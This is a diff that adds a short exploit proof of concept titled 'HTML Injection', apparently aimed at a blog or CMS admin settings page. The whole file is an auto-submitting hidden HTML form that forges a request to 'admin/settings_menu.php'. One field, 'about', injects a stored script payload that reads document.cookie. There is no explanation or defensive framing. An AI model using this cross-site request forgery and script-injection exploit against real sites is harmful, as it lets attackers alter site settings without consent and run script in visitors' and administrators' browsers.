@@ -1,0 +1,24 @@
+HTML Injection
+
+<form action="http://host/admin/settings_menu.php" method="post" enctype="multipart/form-data" name="main">
+<input type="hidden" name="Submit" value="Submit ››">
+<input type="hidden" name="search" value="1">
+<input type="hidden" name="teasers" value="1">
+<input type="hidden" name="archive" value="1">
+<input type="hidden" name="latestentries" value="1">
+<input type="hidden" name="nr_entries" value="10">
+<input type="hidden" name="latestcomments" value="1">
+<input type="hidden" name="nr_comments" value="10">
+<input type="hidden" name="categories" value="1">
+<input type="hidden" name="authors" value="1">
+<input type="hidden" name="pages" value="1">
+<input type="hidden" name="meta" value="1">
+<input type="hidden" name="login" value="1">
+<input type="hidden" name="use_join" value="1">
+<input type="hidden" name="powered" value="1">
+<input type="hidden" name="about" value='about"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="customfield" value="customfield">
+</form>
+<script>
+document.main.submit();
+</script>
